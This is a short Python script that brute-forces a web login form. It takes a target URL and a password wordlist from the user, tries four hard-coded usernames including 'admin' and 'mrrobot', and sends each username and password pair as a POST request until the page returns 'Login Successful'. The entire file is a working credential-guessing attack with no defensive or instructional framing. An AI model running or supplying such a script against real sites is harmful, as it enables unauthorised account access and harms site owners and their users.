#!/usr/bin/python3
import requests
import sys  # Provides access to system functions

# Get target URL from user input
target = input("Provide Target URL: ")

# List of potential usernames
usernames = ["admin", "user", "test","mrrobot"]

# Get wordlist file path from user input
passwords = input("Location path wordlist>> ")

# Keyword/phrase to detect successful login
magic_word = "Login Successful"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n")  # Strip newline characters
            
            # Display the current attempt
            sys.stdout.write(f"[x] Attempting user:password -> {username} : {password}\r")
            sys.stdout.flush()  # Ensures immediate output without buffering

            # Make a POST request to the target login form with the current credentials
            r = requests.post(target, data={"username": username, "password": password})

            # Check if the response contains the success keyword
            if magic_word.strip() in r.text.strip():
                sys.stdout.write("\n")
                sys.stdout.write(f"\t[>>>>] Valid Password '{password}' found for user '{username}'!\n")
                sys.exit()

    sys.stdout.write("\n")
    sys.stdout.write(f"\tNo valid password found for user '{username}'. Moving to next user.\n")
    sys.stdout.flush()  # Ensures proper output before continuing